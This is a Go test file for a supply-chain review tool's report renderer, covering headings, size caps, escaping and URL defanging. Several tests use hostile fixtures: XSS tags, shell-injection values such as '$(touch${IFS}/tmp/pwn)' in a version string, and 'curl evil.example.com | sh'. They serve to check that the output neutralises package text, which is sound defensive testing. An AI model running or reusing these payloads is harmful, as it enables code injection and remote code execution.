// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package report

import (
	"fmt"
	"regexp"
	"strings"
	"testing"

	"github.com/RhythmShahriar/rhythm/kit/cli"
	"github.com/RhythmShahriar/sightread/core"
	"github.com/RhythmShahriar/sightread/core/coretest"
)

func writeMD(t testing.TB, r *core.Report) string {
	t.Helper()
	return string(writeWith(t, core.FormatMarkdown, r, testOpts))
}

func TestMarkdownGolden(t *testing.T) {
	coretest.Golden(t, "sample.md", []byte(writeMD(t, coretest.SampleReport())))
}

// TestMarkdownLayout asserts the fixed lines of PRD 9.4 and 18.
func TestMarkdownLayout(t *testing.T) {
	out := writeMD(t, coretest.SampleReport())
	for _, want := range []string{
		"## Sightread: 1 to hold, 1 to review and 1 unverified\n",
		"| Verdict | Update | From | To | Findings |\n|---|---|---|---|---|\n",
		"| 🛑 HOLD | countdown-timer-ultimate (wp-plugin) | 2.6.7 | 2.6.8 | 11 critical |",
		"| ✅ ROUTINE | wpforms-lite (wp-plugin) on 2 sites | 1.9.1 | 1.9.2 | none |",
		"### 🛑 countdown-timer-ultimate 2.6.7 → 2.6.8\n",
		"Integrity (both versions): every file matches wordpress.org checksums \\(SHA-256\\). Publisher: sampleauthor.",
		`Changelog: 2.6.8: "Check compatibility with WordPress 6.8"`,
		"| Severity | Signal | Where | Evidence |",
		"(raised by owner-change)",
		"(demoted: vendored path)",
		"Not counted: 1 in the baseline, 1 ignored by config and 1 below --min-confidence.",
		"<details><summary>Diff of the flagged lines</summary>\n\n```diff\n@@ -80,2 +80,4 @@ includes/class-wpos-analytics.php\n",
		// countdown's archive doesn't match its hash: allow would refuse it.
		"This version doesn't match its published hash, so it can't be allowed.\n",
		"Record your review: `rhythm sightread allow npm:@acme/widgets@1.5.0 --reason \"...\"`",
		"### Not checked\n",
		"Static diff of official releases; Sightread never ran this code. Not proof an update is safe.",
		"Sightread reports what changed. It does not judge intent.",
		"[Signal reference](https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference) · rhythm-sightread 1.0.0\n",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q", want)
		}
	}
	// ROUTINE, ALLOWED and a finding-free UNVERIFIED get no section.
	for _, not := range []string{"### ✅ monolog", "### ✅ wordfence", "### ⚠️ astra", "trimmed"} {
		if strings.Contains(out, not) {
			t.Errorf("unexpected %q", not)
		}
	}
}

func TestMarkdownHeadings(t *testing.T) {
	clean := smallReport()
	if got := writeMD(t, clean); !strings.HasPrefix(got, "## Sightread: no risk signals in 1 update\n") {
		t.Errorf("clean heading: %q", firstLineOf(got))
	}
	empty := &core.Report{Kind: core.KindReview, Complete: true}
	if got := writeMD(t, empty); !strings.HasPrefix(got, "## Sightread: no updates to review\n") {
		t.Errorf("empty heading: %q", firstLineOf(got))
	}
	two := smallReport()
	two.Updates = append(two.Updates, two.Updates[0], two.Updates[0])
	two.Updates[0].Verdict, two.Updates[1].Verdict = core.Hold, core.Review
	two.Summary = core.Summary{Updates: 3, Hold: 1, Review: 2}
	if got := writeMD(t, two); !strings.HasPrefix(got, "## Sightread: 1 to hold and 2 to review\n") {
		t.Errorf("hold and review heading: %q", firstLineOf(got))
	}
}

func firstLineOf(s string) string { l, _, _ := strings.Cut(s, "\n"); return l }

// TestMarkdownUnverifiedWithFindings: an update reviewed with
// --allow-unverified keeps its findings in a section.
func TestMarkdownUnverifiedWithFindings(t *testing.T) {
	r := smallReport()
	u := &r.Updates[0]
	u.Verdict, u.To.Verified = core.Unverified, core.ByNone
	u.Findings = []core.Finding{{ID: "eval-dynamic", Title: "Runs code built at run time", Severity: cli.SeverityHigh, File: "index.js", Line: 3}}
	out := writeMD(t, r)
	if !strings.Contains(out, "### ⚠️ left-pad 1.3.0 → 1.3.1\n") {
		t.Errorf("no section for an unverified update with findings:\n%s", out)
	}
	if !strings.Contains(out, "### Unverified\n\n- left-pad 1.3.1 (npm): its integrity could not be checked") {
		t.Errorf("no Unverified list:\n%s", out)
	}
	// Not diffed: --allow-unverified would review it.
	if !strings.Contains(out, "`--allow-unverified` reviews them anyway") {
		t.Errorf("no hint for an update not diffed:\n%s", out)
	}
	// Diffed with --allow-unverified: the hint would contradict the
	// findings above it.
	u.Diff = core.DiffStats{FilesChanged: 1, LinesAdded: 1, BytesTo: 10}
	out = writeMD(t, r)
	if strings.Contains(out, "reviews them anyway") || !strings.Contains(out, "Reviewed with `--allow-unverified`: these releases could not be verified.") {
		t.Errorf("a diffed update gets the --allow-unverified hint:\n%s", out)
	}
}

// TestMarkdownAllowRefused: an update allow would refuse (E18 or a local
// copy) gets the reason in place of the allow command, which users copy
// from pull request comments; a verified one gets the command.
func TestMarkdownAllowRefused(t *testing.T) {
	cases := []struct {
		name string
		edit func(u *core.Update)
		want string
	}{
		{"verified", func(*core.Update) {}, "Record your review: `rhythm sightread allow npm:left-pad@1.3.1 --reason \"...\"`"},
		{"unverified", func(u *core.Update) { u.Verdict, u.To.Verified = core.Unverified, core.ByNone }, allowUnverified},
		{"local copy", func(u *core.Update) {
			u.To.Version, u.To.Verified, u.To.Source = "2.8.1", core.ByNone, "local file"
		}, allowUnverified},
		{"failed", func(u *core.Update) { u.To.Verified = core.ByFailed }, allowMismatch},
		{"integrity-mismatch", func(u *core.Update) {
			u.Findings = append(u.Findings, core.Finding{ID: "integrity-mismatch", Severity: cli.SeverityCritical})
		}, allowMismatch},
		{"approved-version-changed", func(u *core.Update) {
			u.Findings = append(u.Findings, core.Finding{ID: "approved-version-changed", Severity: cli.SeverityCritical})
		}, allowChanged},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			r := smallReport()
			u := &r.Updates[0]
			u.Verdict = core.Hold
			u.Findings = []core.Finding{{ID: "eval-dynamic", Title: "Runs code built at run time", Severity: cli.SeverityHigh, File: "index.js", Line: 3}}
			c.edit(u)
			out := writeMD(t, r)
			if !strings.Contains(out, c.want+"\n") {
				t.Errorf("missing %q:\n%s", c.want, out)
			}
			if c.name != "verified" && strings.Contains(out, " allow ") {
				t.Errorf("an allow command for a version allow refuses:\n%s", out)
			}
		})
	}
}

func TestMarkdownRoutineFold(t *testing.T) {
	for _, tc := range []struct {
		n    int
		fold bool
	}{{10, false}, {11, true}} {
		r := smallReport()
		base := r.Updates[0]
		r.Updates = nil
		for i := range tc.n {
			u := base
			u.Name = fmt.Sprintf("pkg-%02d", i)
			r.Updates = append(r.Updates, u)
		}
		out := writeMD(t, r)
		folded := strings.Contains(out, fmt.Sprintf("<details><summary>%d updates with no risk signals</summary>", tc.n))
		if folded != tc.fold {
			t.Errorf("%d routine updates: folded %v, want %v\n%s", tc.n, folded, tc.fold, out)
		}
		if got := strings.Count(out, "| ✅ ROUTINE | pkg-"); got != tc.n {
			t.Errorf("%d routine updates: %d rows", tc.n, got)
		}
	}
}

// TestMarkdownHostileText is T-52: package text renders as text, never as
// a mention, a link, an image or HTML.
func TestMarkdownHostileText(t *testing.T) {
	r := smallReport()
	u := &r.Updates[0]
	u.Verdict = core.Review
	u.Name = "[login](https://evil.test)"
	u.To.Publisher = []string{"@octocat"}
	u.From.Publisher = []string{"<img src=x onerror=alert(1)>"}
	u.Changelog = []core.ChangelogEntry{{Version: "1.3.1", Text: "Thanks @octocat! See [login](https://evil.test) <script>alert(1)</script> www.evil.test"}}
	u.Findings = []core.Finding{{ID: "outbound-new-domain", Title: "Contacts a new domain", Severity: cli.SeverityMedium,
		File: "lib/<img src=x onerror=alert(1)>.js", Line: 4, Evidence: core.NewSnippet("fetch('https://evil.test/x') // @octocat | `tick`")}}
	r.Notes = []string{"@octocat [login](https://evil.test)"}
	r.NotChecked = []core.NotChecked{{Name: "<b>bold</b>", Text: "@octocat"}}
	out := writeMD(t, r)

	prose := outsideCode(out)
	prose = strings.ReplaceAll(prose, "[Signal reference]("+signalReference+")", "")
	prose = ownTags.ReplaceAllString(prose, "")
	if m := liveMarkup.FindString(prose); m != "" {
		t.Errorf("%q is live outside code:\n%s", m, prose)
	}
	if m := mention.FindString(prose); m != "" {
		t.Errorf("unescaped mention %q:\n%s", m, prose)
	}
	if strings.Contains(prose, "https://evil.test") {
		t.Errorf("a live URL is in the prose:\n%s", prose)
	}
	// Inside code spans the domain is defanged and the pipe can't split
	// the table row.
	if !strings.Contains(out, "`fetch('hxxps://evil[.]test/x') // @octocat \\| `` `tick` ``") &&
		!strings.Contains(out, "hxxps://evil[.]test/x") {
		t.Errorf("evidence not defanged:\n%s", out)
	}
	if strings.Contains(out, "https://evil.test") || strings.Contains(out, "evil.test/x") {
		t.Errorf("a live URL is in the output:\n%s", out)
	}
	for _, line := range strings.Split(out, "\n") {
		if strings.HasPrefix(line, "| medium |") && cells(line) != 4 {
			t.Errorf("a package pipe split the row into %d cells: %s", cells(line), line)
		}
	}
}

// cells counts the cells of a table row, skipping \| escapes.
// TestAllowCommandHostile checks the copyable allow line quotes a hostile
// name and version in every format that shows it.
func TestAllowCommandHostile(t *testing.T) {
	r := smallReport()
	u := &r.Updates[0]
	u.Verdict = core.Review
	u.Eco = core.WPPlugin
	u.Name = "x;id"
	u.To.Version = "1.0$(touch${IFS}/tmp/pwn)"
	u.To.SHA256 = strings.Repeat("a", 64)
	want := `rhythm sightread allow 'wp-plugin:x;id@1.0$(touch${IFS}/tmp/pwn)' --reason "..."`
	bad := `allow wp-plugin:x;id`
	for name, out := range map[string]string{
		"markdown": writeMD(t, r),
		"terminal": writeTerm(t, r, termOpts(100)),
	} {
		if !strings.Contains(out, want) {
			t.Errorf("%s: allow line not quoted, want %q in:\n%s", name, want, out)
		}
		if strings.Contains(out, bad) {
			t.Errorf("%s: unquoted allow line in:\n%s", name, out)
		}
	}
	html := writeHTML(t, r)
	if !strings.Contains(html, "allow &#39;wp-plugin:x;id@1.0$(touch${IFS}/tmp/pwn)&#39;") {
		t.Errorf("html: allow line not quoted:\n%s", html)
	}
	if strings.Contains(html, bad) {
		t.Error("html: unquoted allow line")
	}
	// A plain name stays unquoted so the usual line reads cleanly.
	u.Name, u.To.Version = "akismet", "5.3.1"
	if out := writeMD(t, r); !strings.Contains(out, "allow wp-plugin:akismet@5.3.1 --reason") {
		t.Errorf("plain allow line changed:\n%s", out)
	}
}

func cells(row string) int {
	row = strings.ReplaceAll(row, `\|`, "")
	return strings.Count(row, "|") - 1
}

// outsideCode removes fenced blocks and code spans, leaving what GitHub
// parses as Markdown.
func outsideCode(s string) string {
	var b strings.Builder
	fence := ""
	for _, line := range strings.SplitAfter(s, "\n") {
		trimmed := strings.TrimSpace(line)
		if fence != "" {
			if strings.HasPrefix(trimmed, fence) && strings.Trim(trimmed, "`") == "" {
				fence = ""
			}
			continue
		}
		if strings.HasPrefix(trimmed, "```") {
			fence = trimmed[:len(trimmed)-len(strings.TrimLeft(trimmed, "`"))]
			continue
		}
		b.WriteString(stripSpans(line))
	}
	return b.String()
}

// stripSpans removes inline code spans: a run of n backticks up to the
// next run of exactly n.
func stripSpans(line string) string {
	var b strings.Builder
	for i := 0; i < len(line); {
		if line[i] == '\\' && i+1 < len(line) {
			b.WriteString(line[i : i+2])
			i += 2
			continue
		}
		if line[i] != '`' {
			b.WriteByte(line[i])
			i++
			continue
		}
		n := 0
		for i+n < len(line) && line[i+n] == '`' {
			n++
		}
		closeAt := -1
		for j := i + n; j < len(line); {
			if line[j] != '`' {
				j++
				continue
			}
			m := 0
			for j+m < len(line) && line[j+m] == '`' {
				m++
			}
			if m == n {
				closeAt = j + m
				break
			}
			j += m
		}
		if closeAt < 0 {
			b.WriteString(line[i : i+n])
			i += n
			continue
		}
		i = closeAt
	}
	return b.String()
}

// TestDefang: URLs, www. names and the hosts the findings report are
// defanged; any other dotted name is code and stays as written.
func TestDefang(t *testing.T) {
	hosts := hostSet{"evil.example.com": true, "wpos-cdn.example": true}
	for _, tc := range []struct{ in, want string }{
		// Positive: URLs, reported hosts and the hosts below them.
		{"https://analytics.wpos-cdn.example/v2/p", "hxxps://analytics.wpos-cdn[.]example/v2/p"},
		{"http://evil.test", "hxxp://evil[.]test"},
		{"HTTPS://Evil.Test/x", "hxxps://Evil[.]Test/x"},
		{"curl evil.example.com | sh", "curl evil.example[.]com | sh"},
		{"curl api.evil.example.com", "curl api.evil.example[.]com"},
		{"fetch('analytics.wpos-cdn.example')", "fetch('analytics.wpos-cdn[.]example')"},
		{"see www.shop.test", "see www.shop[.]test"},
		{"https://evil.zip/x", "hxxps://evil[.]zip/x"},
		// Negative: code, files and versions.
		{"http.get(url, (res) => {", "http.get(url, (res) => {"},
		{"res.on('data', c => body += c)", "res.on('data', c => body += c)"},
		{"fs.writeFileSync(p, body)", "fs.writeFileSync(p, body)"},
		{"user.name = req.host", "user.name = req.host"},
		{"other.example.com", "other.example.com"},
		{"includes/class-api.php:12", "includes/class-api.php:12"},
		{"dist/app.min.js", "dist/app.min.js"},
		{"1.2.3", "1.2.3"},
		{"no domain here", "no domain here"},
		{"hxxps://a[.]example", "hxxps://a[.]example"}, // already defanged stays the same
	} {
		if got := defang(tc.in, hosts); got != tc.want {
			t.Errorf("defang(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
	if got := defangHost("Evil.Example"); got != "Evil[.]Example" {
		t.Errorf("defangHost = %q", got)
	}
}

// TestDefangDiffKeepsCode: the PR comment's diff shows a package's code
// as written; only the host its finding reports is defanged.
func TestDefangDiffKeepsCode(t *testing.T) {
	r := coretest.SampleReport()
	u := &r.Updates[0]
	f := &u.Findings[0]
	f.File, f.Line, f.EndLine, f.Domains = "lib/net.js", 2, 2, []string{"collector.test"}
	f.Baselined, f.Ignored, f.BelowConfidence, f.Allowed = false, false, false, nil
	u.Hunks = []core.Hunk{{Path: "lib/net.js", OldStart: 1, OldLines: 1, NewStart: 1, NewLines: 3, Lines: []string{
		" const https = require('https');",
		"+https.get('https://api.collector.test/p', res => res.on('data', d => fs.writeFileSync(p, d)));",
		"+const host = 'collector.test';",
	}}}
	md, h := writeMD(t, r), writeHTML(t, r)
	for name, out := range map[string]string{"markdown": md, "html": h} {
		for _, want := range []string{"https.get(", "res.on(", "fs.writeFileSync(", "hxxps://api.collector[.]test/p", "collector[.]test"} {
			if !strings.Contains(out, want) {
				t.Errorf("%s: missing %q", name, want)
			}
		}
		for _, not := range []string{"https[.]get", "res[.]on", "fs[.]writeFileSync", "'collector.test'", "&#39;collector.test&#39;"} {
			if strings.Contains(out, not) {
				t.Errorf("%s: has %q", name, not)
			}
		}
	}
}

func TestMarkdownInlineVersion(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"2.6.7", "2.6.7"},
		{"1.0.0-beta.1", "1.0.0-beta.1"},
		{"v1.2", "v1.2"},
		{"<1.0", "\\<1.0"},
	} {
		if got := mdInline(tc.in); got != tc.want {
			t.Errorf("mdInline(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
	// At the start of a list item the guard stays.
	if got := md("1. item"); got != "1\\. item" {
		t.Errorf("md kept no list guard: %q", got)
	}
}

// TestMarkdownSizeCap: 500 updates with long hunks stay under the cap,
// the table keeps every update and the trim note is there.
func TestMarkdownSizeCap(t *testing.T) {
	r := &core.Report{Kind: core.KindReview, Complete: true}
	long := strings.Repeat("x", 300)
	for i := range 500 {
		u := core.Update{Eco: core.NPM, Name: fmt.Sprintf("pkg-%03d", i), Verdict: core.Review,
			From: core.Side{Version: "1.0.0", Verified: core.BySignature}, To: core.Side{Version: "1.0.1", Verified: core.BySignature}}
		for j := range 8 {
			file := fmt.Sprintf("lib/f%d.js", j)
			u.Findings = append(u.Findings, core.Finding{ID: "eval-dynamic", Title: "Runs code built at run time", Severity: cli.SeverityHigh,
				File: file, Line: 2, Evidence: core.NewSnippet("eval(" + long + ")")})
			u.Hunks = append(u.Hunks, core.Hunk{Path: file, NewStart: 1, NewLines: 3, Lines: []string{"+" + long, "+" + long, "+" + long}})
		}
		r.Updates = append(r.Updates, u)
	}
	r.Summary.Review = 500
	out := writeMD(t, r)
	if len(out) > markdownMax {
		t.Errorf("Markdown is %d characters, over %d", len(out), markdownMax)
	}
	if !strings.Contains(out, trimmedNote) {
		t.Error("no trim note")
	}
	if !strings.Contains(out, honestyLine) || !strings.Contains(out, intentLine) {
		t.Error("the footer was cut")
	}
	if strings.Contains(out, "<details><summary>Diff") {
		t.Error("hunks were kept although the report was trimmed")
	}
	if !regexp.MustCompile(`\n\d+ more updates with findings are not shown here\.\n`).MatchString(out) {
		t.Error("no line for the update sections left out")
	}
	if got := strings.Count(out, "| ⚠️ REVIEW | pkg-"); got != 500 {
		t.Errorf("the table lists %d of 500 updates", got)
	}
}

// TestMarkdownTrimOrder: hunks go first; findings stay while they fit.
func TestMarkdownTrimOrder(t *testing.T) {
	r := smallReport()
	u := &r.Updates[0]
	u.Verdict = core.Review
	for j := range 8 {
		u.Findings = append(u.Findings, core.Finding{ID: "eval-dynamic", Title: "Runs code built at run time", Severity: cli.SeverityHigh,
			File: "a.js", Line: j + 1, Evidence: core.NewSnippet("eval(x)")})
	}
	var lines []string
	for range 4000 {
		lines = append(lines, "+"+strings.Repeat("y", 20))
	}
	u.Hunks = []core.Hunk{{Path: "a.js", NewStart: 1, NewLines: len(lines), Lines: lines}}
	out := writeMD(t, r)
	if strings.Contains(out, "Diff of the flagged lines") {
		t.Error("hunks kept over the cap")
	}
	if got := strings.Count(out, "| high | Runs code"); got != 8 {
		t.Errorf("%d findings shown, want all 8 once hunks are gone", got)
	}
	if !strings.Contains(out, "> "+trimmedNote) {
		t.Error("no trim note")
	}

	small := smallReport()
	if strings.Contains(writeMD(t, small), trimmedNote) {
		t.Error("a small report says it was trimmed")
	}
}

func TestMarkdownFlaggedHunks(t *testing.T) {
	h1 := core.Hunk{Path: "a.php", NewStart: 10, NewLines: 5}
	h2 := core.Hunk{Path: "a.php", NewStart: 100, NewLines: 5}
	h3 := core.Hunk{Path: "b.php", NewStart: 1, NewLines: 5}
	u := &core.Update{Hunks: []core.Hunk{h1, h2, h3}}
	for _, tc := range []struct {
		name string
		f    core.Finding
		want []int
	}{
		{"covered line", core.Finding{File: "a.php", Line: 12}, []int{10}},
		{"line past every hunk falls back to the file", core.Finding{File: "a.php", Line: 50}, []int{10, 100}},
		{"no line takes the file", core.Finding{File: "b.php"}, []int{1}},
		{"other file", core.Finding{File: "c.php", Line: 1}, nil},
		{"no file", core.Finding{Line: 1}, nil},
		{"range reaching into a hunk", core.Finding{File: "a.php", Line: 95, EndLine: 101}, []int{100}},
	} {
		var got []int
		for _, h := range flagged(u, []*core.Finding{&tc.f}) {
			got = append(got, h.NewStart)
		}
		if fmt.Sprint(got) != fmt.Sprint(tc.want) {
			t.Errorf("%s: got hunks at %v, want %v", tc.name, got, tc.want)
		}
	}
}

// TestMarkdownHunkFence: a hunk with backticks can't close the diff block.
func TestMarkdownHunkFence(t *testing.T) {
	r := smallReport()
	u := &r.Updates[0]
	u.Verdict = core.Review
	u.Findings = []core.Finding{{ID: "eval-dynamic", Title: "t", Severity: cli.SeverityHigh, File: "a.md", Line: 1}}
	u.Hunks = []core.Hunk{{Path: "a.md", NewStart: 1, NewLines: 2, Lines: []string{"+```", "+</details><img src=x onerror=alert(1)>"}}}
	out := writeMD(t, r)
	if !strings.Contains(out, "````diff\n") {
		t.Errorf("the fence is not longer than the hunk's backticks:\n%s", out)
	}
	if strings.Contains(outsideCode(out), "<img") {
		t.Errorf("hunk HTML escaped the code block:\n%s", out)
	}
}

func TestMarkdownSignedFooter(t *testing.T) {
	o := testOpts
	o.Signed = strings.Repeat("ab", 32)
	out := string(writeWith(t, core.FormatMarkdown, smallReport(), o))
	if !strings.Contains(out, "Signed JSON report sha256: `"+o.Signed+"`") {
		t.Errorf("no signed hash in the footer:\n%s", out)
	}
}

func TestMarkdownIncompleteLine(t *testing.T) {
	r := smallReport()
	r.Complete = false
	r.StoppedBy = "deadline"
	if out := writeMD(t, r); !strings.Contains(out, "**Incomplete review:** the run hit its --deadline.") {
		t.Errorf("no incomplete line:\n%s", out)
	}
	if out := writeMD(t, smallReport()); strings.Contains(out, "Incomplete") {
		t.Error("a complete run says it is incomplete")
	}
}

// TestMarkdownSetAside: findings the baseline or a config ignore set
// aside show in the heading, the row and the notes; the heading never
// says there are no risk signals. The HTML table and notes say the same.
func TestMarkdownSetAside(t *testing.T) {
	out := writeMD(t, setAsideReport())
	for _, want := range []string{"## Sightread: 1 update, 2 findings not counted", "| 2 not counted |", "2 findings were not counted"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "no risk signals") {
		t.Errorf("says no risk signals:\n%s", out)
	}
	html := writeHTML(t, setAsideReport())
	for _, want := range []string{">2 not counted</td>", "2 findings were not counted"} {
		if !strings.Contains(html, want) {
			t.Errorf("HTML missing %q", want)
		}
	}
}

// TestMarkdownHidden: hidden findings show in the heading, the row and
// the notes; the heading never says there are no risk signals.
func TestMarkdownHidden(t *testing.T) {
	out := writeMD(t, hiddenReport())
	for _, want := range []string{"## Sightread: 1 update, 1 finding hidden", "| 1 low, 1 of them hidden |", "1 finding is hidden by --severity medium"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "no risk signals") {
		t.Errorf("says no risk signals:\n%s", out)
	}
	if out := writeMD(t, smallReport()); !strings.Contains(out, "## Sightread: no risk signals in 1 update") {
		t.Errorf("the clean heading is gone:\n%s", out)
	}
}
